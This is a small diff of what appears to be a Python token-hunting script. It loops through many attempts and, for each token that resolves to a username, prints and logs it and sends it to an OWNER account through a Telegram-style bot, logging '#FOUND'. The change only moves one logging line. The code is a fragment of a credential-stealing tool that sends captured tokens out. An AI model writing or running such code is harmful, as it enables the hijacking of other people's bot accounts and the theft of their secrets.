@@ -11,10 +11,10 @@ for k in range(500):
   if username:
     print(token)
     LOGGING(username)
+    LOGGING(token[15:])
     new_bot.send_message(OWNER, token)
     LOGGING("Har Har Mahadev 🚩")
     LOGGING("#FOUND")
-    LOGGING(token[15:])
   if botNo == THREAD_COUNT - 1:
     ATTEMPT += 1
     if ATTEMPT % 500 == 0:
